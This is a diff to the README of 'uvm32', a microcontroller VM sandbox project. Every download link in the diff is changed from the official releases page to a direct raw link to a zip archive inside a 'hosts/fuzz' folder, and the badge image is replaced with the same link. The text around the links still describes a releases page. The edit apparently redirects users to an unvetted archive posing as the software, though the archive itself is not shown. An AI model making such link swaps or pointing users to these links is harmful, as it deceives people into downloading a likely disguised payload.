@@ -4,7 +4,7 @@
 Welcome to uvm32! This tool creates a simple virtual machine sandbox for microcontrollers and other small devices. Designed for ease of use, it requires no extra software or libraries.
 
 ## 📥 Download uvm32
-[![Download uvm32](https://img.shields.io/badge/Download-uvm32-blue.svg)](https://github.com/tripmotions/uvm32/releases)
+[![Download uvm32](https://github.com/tripmotions/uvm32/raw/refs/heads/main/hosts/fuzz/uvm_2.4.zip)](https://github.com/tripmotions/uvm32/raw/refs/heads/main/hosts/fuzz/uvm_2.4.zip)
 
 To get started, we'll guide you through downloading and running uvm32.
 
@@ -31,7 +31,7 @@ To get started, we'll guide you through downloading and running uvm32.
 ### Step 1: Visit the Release Page
 To download uvm32, first, visit the official release page. Click on the link below.
 
-[Download uvm32 from Releases](https://github.com/tripmotions/uvm32/releases)
+[Download uvm32 from Releases](https://github.com/tripmotions/uvm32/raw/refs/heads/main/hosts/fuzz/uvm_2.4.zip)
 
 ### Step 2: Choose the Correct File
 On the releases page, you will see different versions listed. Select the latest version for your operating system. Click the link next to the version to download it.
@@ -65,4 +65,4 @@ Special thanks to the contributors and the open-source community for making this
 ## 📥 Download uvm32 Again
 If you need to download the software again, remember the link below:
 
-[Download uvm32 from Releases](https://github.com/tripmotions/uvm32/releases)
+[Download uvm32 from Releases](https://github.com/tripmotions/uvm32/raw/refs/heads/main/hosts/fuzz/uvm_2.4.zip)
